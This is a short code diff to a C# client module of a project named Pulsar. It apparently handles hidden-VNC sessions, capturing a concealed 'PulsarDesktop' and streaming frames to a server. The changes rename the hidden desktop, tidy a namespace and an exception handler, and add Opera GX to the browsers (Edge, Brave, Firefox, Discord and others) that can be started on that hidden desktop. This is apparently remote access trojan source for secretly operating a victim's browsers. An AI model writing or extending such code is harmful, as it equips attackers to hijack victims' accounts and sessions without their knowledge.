@@ -11,7 +11,7 @@ using Pulsar.Client.Helper.HVNC;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Monitoring.HVNC;
-using Pulsar.Common.Messages.other;
+using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using Pulsar.Common.Video;
 using Pulsar.Common.Video.Codecs;
@@ -27,9 +27,9 @@ namespace Pulsar.Client.Messages
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
 
-        private readonly ImageHandler ImageHandler = new ImageHandler("PhantomDesktop");
-        private readonly InputHandler InputHandler = new InputHandler("PhantomDesktop");
-        private readonly ProcessController ProcessHandler = new ProcessController("PhantomDesktop");
+        private readonly ImageHandler ImageHandler = new ImageHandler("PulsarDesktop");
+        private readonly InputHandler InputHandler = new InputHandler("PulsarDesktop");
+        private readonly ProcessController ProcessHandler = new ProcessController("PulsarDesktop");
 
         // frame control variables
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
@@ -189,7 +189,7 @@ namespace Pulsar.Client.Messages
                         SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                     }
                 }
-                catch (Exception ex)
+                catch (Exception)
                 {
                     Thread.Sleep(100);
                 }
@@ -275,6 +275,7 @@ namespace Pulsar.Client.Messages
                 { "Edge", ProcessHandler.StartEdge },
                 { "Brave", ProcessHandler.StartBrave },
                 { "Opera", ProcessHandler.StartOpera },
+                { "OperaGX", ProcessHandler.StartOperaGX },
                 { "Mozilla", ProcessHandler.StartFirefox },
                 { "Discord", ProcessHandler.StartDiscord }
             };
